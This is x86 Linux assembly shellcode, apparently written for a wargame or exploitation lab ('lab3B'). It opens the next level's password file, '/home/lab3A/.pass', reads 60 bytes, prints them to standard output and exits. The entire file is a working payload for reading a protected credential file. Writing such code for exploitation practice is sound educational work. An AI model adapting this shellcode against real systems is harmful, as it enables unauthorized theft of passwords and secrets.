; shellcode to simulate the cat, for lab3B
Section .text
global _start

_start:
    ; clear a bunch of registers
    xor ebx, ebx
    mul ebx

    ; put 0 in ecx ( O_RDONLY ) and edx ( mode 0 ) is already 0 from the mul above
    ; xor edx, edx
    xor ecx, ecx

    ; "/home/lab3A/.pass"
    push 0x00000073
    push 0x7361702e
    push 0x2f413362
    push 0x616c2f65
    push 0x6d6f682f

    mov ebx, esp
    mov al, 5
    int 0x80

    ; at this point eax contains the file descriptor for the file we opened
    mov ebx, eax

    ; decrement the stack pointer so we don't overwrite our shellcode
    mov ecx, esp
    sub ecx, 0x200

    ; how many chars to read
    mov edx, 60

    ; read
    mov eax, 3
    int 0x80

    ; which interrupt
    mov eax, 4
    ; which file descriptor
    mov ebx, 1
    ; length of string to read
    mov edx, 60
    int 0x80

    ; exit
    mov eax, 1
    xor ebx, ebx
    int 0x80
